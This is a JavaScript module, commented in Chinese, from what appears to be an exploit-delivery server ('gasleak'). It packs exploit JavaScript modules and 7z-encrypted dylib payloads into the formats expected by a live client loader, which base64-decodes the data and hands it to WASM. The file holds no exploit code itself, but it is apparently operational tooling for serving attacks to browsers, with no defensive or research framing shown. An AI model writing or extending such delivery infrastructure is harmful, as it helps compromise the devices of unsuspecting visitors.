/**
 * 模块封装策略 —— 解决「服务端加密」与「客户端解密」格式不一致
 *
 * 【问题（已实测）】
 * gasleak 的 /details/:name.js 原用 PayloadCrypto（7z + AES-256 密码）分发。
 * 但 templates/exploit/ 下 78 个 .js 的实测格式是：
 *   - .js     : 明文 JS，形如  window["qbrdr"]("<base64>")
 *   - .min.js : 原始二进制（无 7z 魔数）
 *   7z 魔数命中数 = 0
 *
 * 客户端解密入口（9af53c1b...js:168）：
 *   window.qbrdr = A => { E.LA(atob(A)) }
 * 即 qbrdr 只做 base64 解码，真正的解压/解密在 WASM（E.LA）里。
 * 因此对 JS 模块做 7z 加密会导致 atob 直接失败。
 *
 * 【策略】
 * 按载荷形态选择封装方式，而不是一律 7z：
 *   - 'dylib'   -> 7z（PayloadCrypto），与 templates/payloads/*.dylib 现状一致
 *   - 'js-plain'-> 明文直出（模块本就是明文 JS）
 *   - 'js-b64'  -> 包成 window["qbrdr"]("<base64>")（与现网 .js 契约一致）
 *   - 'binary'  -> 原样二进制直出（对应 .min.js 形态）
 *
 * plan 由调用方指定，避免猜测。默认对 JS 模块用 'js-plain'（最小改动、可回退）。
 */

import { writeFile, mkdir } from 'node:fs/promises';
import path from 'node:path';

/** 用于生成 qbrdr 包裹的函数名（与现网一致） */
export const QBRDR_FN = 'qbrdr';

/**
 * @typedef {'dylib'|'js-plain'|'js-b64'|'binary'} PackMode
 */

/**
 * 把模块数据按指定模式写到目标路径。
 *
 * @param {'dylib'|'js-plain'|'js-b64'|'binary'} mode
 * @param {Buffer} data
 * @param {string} outPath
 * @param {object} [deps]  { PayloadCrypto } —— 生产环境需注入，避免硬依赖
 * @returns {Promise<{bytes:number, mode:string}>}
 */
export async function packModule(mode, data, outPath, deps = {}) {
  await mkdir(path.dirname(outPath), { recursive: true });

  switch (mode) {
    case 'dylib': {
      if (!deps.PayloadCrypto) throw new Error('packModule(dylib): PayloadCrypto 未注入');
      await deps.PayloadCrypto.encryptBuffer(data, outPath);
      return { bytes: data.length, mode };
    }
    case 'js-plain': {
      await writeFile(outPath, data);
      return { bytes: data.length, mode };
    }
    case 'js-b64': {
      const b64 = Buffer.from(data).toString('base64');
      const wrapped = `window["${QBRDR_FN}"]("${b64}")`;
      await writeFile(outPath, wrapped, 'utf8');
      return { bytes: Buffer.byteLength(wrapped, 'utf8'), mode };
    }
    case 'binary': {
      await writeFile(outPath, data);
      return { bytes: data.length, mode };
    }
    default:
      throw new Error(`packModule: 未知 mode "${mode}"`);
  }
}

/**
 * 依据源文件形态推断合适的封装模式。
 * 用于在没有显式 plan 时给出合理默认，并可人工覆盖。
 *
 * @param {Buffer} data       源数据
 * @param {string} [srcName]  源文件名（用于 .min.js 判断）
 * @returns {PackMode}
 */
export function inferPackMode(data, srcName = '') {
  // 7z 魔数 -> 本来就是 dylib 归档
  if (data.subarray(0, 6).equals(Buffer.from([0x37, 0x7A, 0xBC, 0xAF, 0x27, 0x1C]))) {
    return 'dylib';
  }
  // 明文 JS（含 window["qbrdr"] 或常规 JS 开头）
  const head = data.subarray(0, 64).toString('utf8');
  if (srcName.endsWith('.min.js')) return 'binary';
  if (/^\uFEFF?[\s(;]*(window\[|!function|function|let |const |var |"use strict")/.test(head)) {
    // 已经是 window["qbrdr"](...) 形态的，保持原样直出
    return 'js-plain';
  }
  return 'binary';
}
